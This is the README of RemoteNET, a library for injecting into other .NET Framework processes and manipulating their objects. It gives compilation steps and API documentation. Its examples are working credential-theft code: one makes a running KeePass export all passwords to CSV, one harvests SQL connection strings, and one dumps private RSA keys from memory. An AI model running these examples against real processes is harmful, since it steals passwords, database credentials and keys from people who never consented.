![icon](https://raw.githubusercontent.com/theXappy/RemoteNET/main/icon.png)
# RemoteNET
This library lets you examine, create and interact with remote objects in other .NET (framework) processes.  
It's like [System.Runtime.Remoting](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting?view=net-5.0) except the other app doesn't need to be compiled (or consent) to support it.

Basically this library lets you mess with objects of any other .NET (framework) app without asking for permissions :)

## Compilation
1. Clone
2. Open `RemoteNET.sln` file in VisualStudio 2019
3. Build Solution (`Ctrl+Shift+B`)

If you get errors of missing exes/dlls make sure the compilation order is set such that  
the C++ projects compile first (BOTH x32 and x64 need to be compiled), then **ScubaDiver** and then **RemoteNET**.

## Minimal Working Example
To get the essence of how easy and usefull this library can be, see below a re-implementation of [denandz/KeeFarce](https://github.com/denandz/KeeFarce).  
This example interacts with an open KeePass process and makes it export all credentials to a CSV file.  
```C#
// Gain foothold within the target process
Process keePassProc =  Process.GetProcessesByName("KeePass").Single();
RemoteApp remoteApp = RemoteApp.Connect(keePassProc);
RemoteActivator rActivator = remoteApp.Activator;

// Get a remote DocumentManagerEx object
IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("KeePass.UI.DocumentManagerEx");
RemoteObject remoteDocumentManagerEx = remoteApp.GetRemoteObject(candidates.Single());
dynamic dynamicDocumentManagerEx = remoteDocumentManagerEx.Dynamify();

// Get sensitive properties to dump
dynamic activeDb = dynamicDocumentManagerEx.ActiveDatabase;
dynamic rootGroup = activeDb.RootGroup;

// Create remote PwExportInfo object (Call Ctor)
RemoteObject pwExportInfo = rActivator.CreateInstance("KeePass.DataExchange.PwExportInfo", rootGroup, activeDb, true);

// Create remote KeePassCsv1x (Call Ctor)
RemoteObject keePassCsv1x = rActivator.CreateInstance("KeePass.DataExchange.Formats.KeePassCsv1x");
dynamic dynamicCsvFormatter = keePassCsv1x.Dynamify();

// Creating a remote FileStream object
string tempOutputFile = Path.ChangeExtension(Path.GetTempFileName(), "csv");
RemoteObject exportFileStream = rActivator.CreateInstance(typeof(FileStream), tempOutputFile, FileMode.Create);

// Calling Export method of exporter
dynamicCsvFormatter.Export(pwExportInfo, exportFileStream, null);

// Showing results in default CSV editor.
Console.WriteLine($"Output written to: {tempOutputFile}");
Process.Start(tempOutputFile);
```

## How To Use
This section documents most parts of the library's API which you'll likely need.

### ★ Setup
To start playing with a remote process you need to create a `RemoteApp` object like so:
```C#
Process target =  Process.GetProcessesByName("OtherDotNetAppName").Single();
RemoteApp remoteApp = RemoteApp.Connect(target);
```

### ★ Getting Remote Objects
RemoteNET allows you to interact with existing objects and create new ones.  
**To find existing objects** you'll need to search the remote heap.  
Use `RemoteApp.QueryInstances` to find possible candidate for the desired object and `RemoteApp.GetRemoteObject` to get a handle of a candidate.  
```C#
IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("MyApp.PasswordContainer");
RemoteObject passwordContainer = remoteApp.GetRemoteObject(candidates.Single());
```
**To create new objects** the `Activator`-lookalike can be used:
```C#
// Creating a remote StringBuilder with default constructor
RemoteObject remoteSb1 = remoteApp.Activator.CreateInstance(typeof(StringBuilder));

// Creating a remote StringBuilder with the (string,int) constructor
RemoteObject remoteSb1 = remoteApp.Activator.CreateInstance(typeof(StringBuilder), "Hello", 100);
```
Note how we used constructor arguments in the second `CreateInstance` call. Those could also be other `RemoteObject`s:
```C#
RemoteObject remoteStringBuilder = remoteApp.Activator.CreateInstance(typeof(StringBuilder));
// Constructing using the "StringWriter(StringBuilder sb)" ctor
RemoteObject remoteStringWriter = remoteApp.Activator.CreateInstance(typeof(StringWriter), remoteStringBuilder);
```

### ★ Reading Remote Fields/Properties
To allow a smooth coding expereince RemoteNET is utilizing a special dynamic object which any `RemoteObject` can turn into.  
This object can be used to access field/properties just if they were field/properties of a local object:
```C#
RemoteObject remoteStringBuilder = remoteApp.Activator.CreateInstance(typeof(StringBuilder));
dynamic dynamicStringBuilder = remoteStringBuilder.Dynamify();
Console.WriteLine("Remote StringBuilder's Capacity: " + dynamicStringBuilder.Capacity)
```
A more interesting example would be retrieving the `ConnectionString`s of every `SqlConnection` instance:
```C#
var sqlConCandidates = remoteApp.QueryInstances(typeof(SqlConnection));
foreach (CandidateObject candidate in sqlConCandidates)
{
    RemoteObject remoteSqlConnection = remoteApp.GetRemoteObject(candidate);
    dynamic dynamicSqlConnection = remoteSqlConnection.Dynamify();
    Console.WriteLine("ConnectionString: " + dynamicSqlConnection.ConnectionString);
}
```

### ★ Invoking Remote Methods
Just like accessing fields, invoking methods can be done on the dynamic objects.  
This fun example dumps all private RSA keys (which are stored in `RSACryptoServiceProvider`s) that are found in the target's memory:
```C#
Func<byte[], string> ToHex = ba => BitConverter.ToString(ba).Replace("-", "");

// Finding every RSACryptoServiceProvider instance
var rsaProviderCandidates = remoteApp.QueryInstances(typeof(RSACryptoServiceProvider));
foreach (CandidateObject candidateRsa in rsaProviderCandidates)
{
    RemoteObject rsaProv = remoteApp.GetRemoteObject(candidateRsa);
    dynamic dynamicRsaProv = rsaProv.Dynamify();
    // Calling remote `ExportParameters`.
    // First parameter (true) indicates we want the private key.
    Console.WriteLine(" * Key found:");
    dynamic parameters = dynamicRsaProv.ExportParameters(true);
    Console.WriteLine("Modulus: " + ToHex(parameters.Modulus));
    Console.WriteLine("Exponent: " + ToHex(parameters.Exponent));
    Console.WriteLine("D: " + ToHex(parameters.D));
    Console.WriteLine("P: " + ToHex(parameters.P));
    Console.WriteLine("Q: " + ToHex(parameters.Q));
    Console.WriteLine("DP: " + ToHex(parameters.DP));
    Console.WriteLine("DQ: " + ToHex(parameters.DQ));
    Console.WriteLine("InverseQ: " + ToHex(parameters.InverseQ));
}
```

## TODOs
1. Generics aren't completely supported
2. Static members
3. Support injecting to self with local diver
4. Document "Reflection API" (RemoteType, RemoteMethodInfo, ... )
5. .NET core/.NET 5
6. Support other .NET framework CLR versions. Currently supports v4.0.30319


## Thanks
**denandz** for his interesting project **KeeFarce** which was a major inspiration for this project.  
Also multiple parts of this project are directly taken from KeeFarce (DLL Injection, Bootstrap, IntPtr-to-Object converter).

**icons8** for the "Puppet" icon

**Raymond Chen** for stating this project shouldn't be done in [this blog post from 2010](https://devblogs.microsoft.com/oldnewthing/20100812-00/?p=13163).  
I really like this qoute from the post:
>If you could obtain all instances of a type, the fundamental logic behind computer programming breaks down. It effectively becomes impossible to reason about code because anything could happen to your objects at any time.
